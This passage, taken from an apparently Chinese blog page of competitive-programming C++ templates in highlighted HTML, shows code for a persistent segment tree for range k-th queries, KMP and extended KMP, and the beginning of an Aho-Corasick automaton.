class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> sz <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            now <span class="token operator">=</span> next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'A'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ed<span class="token punctuation">[</span>now<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h3 id="11-主席树"><a href="#11-主席树" class="headerlink" title="11. 主席树"></a>11. 主席树</h3><h4 id="11-1-区间第K大"><a href="#11-1-区间第K大" class="headerlink" title="11.1 区间第K大"></a>11.1 区间第K大</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span><span class="token keyword">int</span> tot<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> root<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sum<span class="token punctuation">;</span>    <span class="token keyword">int</span> l<span class="token punctuation">,</span>r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> p<span class="token punctuation">[</span>maxn<span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">build</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span><span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> rt<span class="token operator">=</span><span class="token operator">++</span>tot<span class="token punctuation">;</span>    p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token operator">=</span>l<span class="token punctuation">,</span>p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token operator">=</span>r<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l<span class="token operator">==</span>r<span class="token punctuation">)</span>        <span class="token keyword">return</span> rt<span class="token punctuation">;</span>    <span class="token keyword">int</span> mid<span class="token operator">=</span>l<span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token operator">=</span><span class="token function">build</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">;</span>    p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token operator">=</span><span class="token function">build</span><span class="token punctuation">(</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> rt<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span><span class="token keyword">int</span> r<span class="token punctuation">,</span><span class="token keyword">int</span> pre<span class="token punctuation">,</span><span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> rt<span class="token operator">=</span><span class="token operator">++</span>tot<span class="token punctuation">;</span>    p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token operator">=</span>p<span class="token punctuation">[</span>pre<span class="token punctuation">]</span><span class="token punctuation">;</span>    p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mid<span class="token operator">=</span>l<span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l<span class="token operator">==</span>r<span class="token punctuation">)</span> <span class="token keyword">return</span> rt<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>mid<span class="token operator">>=</span>k<span class="token punctuation">)</span> p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token operator">=</span><span class="token function">update</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>mid<span class="token punctuation">,</span>p<span class="token punctuation">[</span>pre<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> p<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token operator">=</span><span class="token function">update</span><span class="token punctuation">(</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token punctuation">,</span>p<span class="token punctuation">[</span>pre<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> rt<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span><span class="token keyword">int</span> r<span class="token punctuation">,</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">,</span><span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l<span class="token operator">==</span>r<span class="token punctuation">)</span>        <span class="token keyword">return</span> l<span class="token punctuation">;</span>    <span class="token keyword">int</span> mid<span class="token operator">=</span>l<span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> sum<span class="token operator">=</span>p<span class="token punctuation">[</span>p<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token operator">-</span>p<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token punctuation">]</span><span class="token punctuation">.</span>sum<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>sum<span class="token operator">>=</span>k<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">query</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>mid<span class="token punctuation">,</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token punctuation">,</span>p<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">.</span>l<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token function">query</span><span class="token punctuation">(</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>r<span class="token punctuation">,</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token punctuation">,</span>p<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">.</span>r<span class="token punctuation">,</span>k<span class="token operator">-</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>vector <span class="token operator">&lt;</span><span class="token keyword">int</span> <span class="token operator">></span>v<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">getid</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">lower_bound</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>v<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token operator">-</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> t<span class="token punctuation">;</span>    cin<span class="token operator">>></span>t<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>t<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tot<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token function">clr</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cin<span class="token operator">>></span>n<span class="token operator">>></span>m<span class="token punctuation">;</span>        root<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cin<span class="token operator">>></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            v<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>v<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span><span class="token function">unique</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>v<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>v<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            root<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>root<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">getid</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>q<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            cin<span class="token operator">>></span>c<span class="token operator">>></span>d<span class="token operator">>></span>q<span class="token punctuation">;</span>            cout<span class="token operator">&lt;&lt;</span>v<span class="token punctuation">[</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>root<span class="token punctuation">[</span>c<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>root<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="12-KMP类算法"><a href="#12-KMP类算法" class="headerlink" title="12. KMP类算法"></a>12. KMP类算法</h3><h4 id="12-1-普通KMP"><a href="#12-1-普通KMP" class="headerlink" title="12.1 普通KMP"></a>12.1 普通KMP</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">KMP</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> next<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">Get_Next</span><span class="token punctuation">(</span><span class="token keyword">const</span> string <span class="token operator">&amp;</span>p<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        next<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        next<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> n<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>p<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                i<span class="token operator">++</span><span class="token punctuation">,</span> j<span class="token operator">++</span><span class="token punctuation">;</span>                next<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>                j <span class="token operator">=</span> next<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//p:匹配串 ； t: 原串</span>    <span class="token keyword">int</span> <span class="token function">Kmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> string <span class="token operator">&amp;</span>t<span class="token punctuation">,</span> <span class="token keyword">const</span> string <span class="token operator">&amp;</span>p<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">Get_Next</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> nt <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> np <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> nt <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;</span> np<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> p<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                i<span class="token operator">++</span><span class="token punctuation">,</span> j<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                j <span class="token operator">=</span> next<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">==</span> np<span class="token punctuation">)</span>            <span class="token keyword">return</span> i <span class="token operator">-</span> j<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/*Next数组的性质：（1）如果 len-next[len] 能被 len 整除则 len - next[len] 是该串的循环节（2）s[0] ~ s[next[len]-1] 中的内容一定能与 s[len-next[len]] ~ s[len-1] 匹配（3）s[0] ~ s[next[i]-1] 中的内容一定能与 s[i-next[i]] ~ s[i-1] 匹配*/</span></code></pre><h4 id="12-2-扩展KMP"><a href="#12-2-扩展KMP" class="headerlink" title="12.2 扩展KMP"></a>12.2 扩展KMP</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* 求解 T 中 nxt[]，注释参考 GetExtend() */</span><span class="token keyword">void</span> <span class="token function">GetNext</span><span class="token punctuation">(</span>string <span class="token operator">&amp;</span> T<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">&amp;</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> nxt<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    nxt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> p <span class="token operator">||</span> i <span class="token operator">+</span> nxt<span class="token punctuation">[</span>i <span class="token operator">-</span> a<span class="token punctuation">]</span> <span class="token operator">>=</span> p<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> p<span class="token punctuation">)</span>                p <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> m <span class="token operator">&amp;&amp;</span> T<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">==</span> T<span class="token punctuation">[</span>p <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span>                p<span class="token operator">++</span><span class="token punctuation">;</span>            nxt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> p <span class="token operator">-</span> i<span class="token punctuation">;</span>            a <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>            nxt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nxt<span class="token punctuation">[</span>i <span class="token operator">-</span> a<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/* 求解 extend[] */</span><span class="token keyword">void</span> <span class="token function">GetExtend</span><span class="token punctuation">(</span>string <span class="token operator">&amp;</span> S<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">&amp;</span> n<span class="token punctuation">,</span> string <span class="token operator">&amp;</span> T<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">&amp;</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> extend<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> nxt<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">GetNext</span><span class="token punctuation">(</span>T<span class="token punctuation">,</span> m<span class="token punctuation">,</span> nxt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> p <span class="token operator">||</span> i <span class="token operator">+</span> nxt<span class="token punctuation">[</span>i <span class="token operator">-</span> a<span class="token punctuation">]</span> <span class="token operator">>=</span> p<span class="token punctuation">)</span> <span class="token comment">// i >= p 的作用：举个典型例子，S 和 T 无一字符相同</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> p<span class="token punctuation">)</span>                p <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">&lt;</span> n <span class="token operator">&amp;&amp;</span> p <span class="token operator">-</span> i <span class="token operator">&lt;</span> m <span class="token operator">&amp;&amp;</span> S<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">==</span> T<span class="token punctuation">[</span>p <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span>                p<span class="token operator">++</span><span class="token punctuation">;</span>            extend<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> p <span class="token operator">-</span> i<span class="token punctuation">;</span>            a <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>            extend<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nxt<span class="token punctuation">[</span>i <span class="token operator">-</span> a<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="13-AC自动机"><a href="#13-AC自动机" class="headerlink" title="13. AC自动机"></a>13. AC自动机</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span><span class="token keyword">char</span> p<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">Aho_Corasick</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> next<span class="token punctuation">[</span>max_tot<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nd<span class="token punctuation">[</span>max_tot<span class="token punctuation">]</span><span class="token punctuation">,</span> fail<span class="token punctuation">[</span>max_tot<span class="token punctuation">]</span><span class="token punctuation">,</span> vis<span class="token punctuation">[</span>max_tot<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> root<span class="token punctuation">,</span> L<span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            next<span class="token punctuation">[</span>L<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        nd<span class="token punctuation">[</span>L<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>L<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> L<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        L <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        root <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> now <span class="token operator">=</span> root<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> sz <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sz<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            key <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'a'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">newnode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            now <span class="token operator">=</span> next<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        nd<span class="token punctuation">[</span>now<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// fail数组含义</span>        <span class="token comment">// 和i节点代表的前缀的后缀匹配的trie上最长真前缀，由trie树性质得唯一</span>        <span class="token comment">// 即当i节点的某边发生失配时转移到达的trie上最长真前缀</span>        <span class="token comment">// if(next[i][j] == -1) next[i][j] = next[fail[i]][j]</span>        queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> Q<span class="token punctuation">;</span>        fail<span class="token punctuation">[</span>root<span class="token punctuation">]</span> <span class="token operator">=</span> root<span class="token 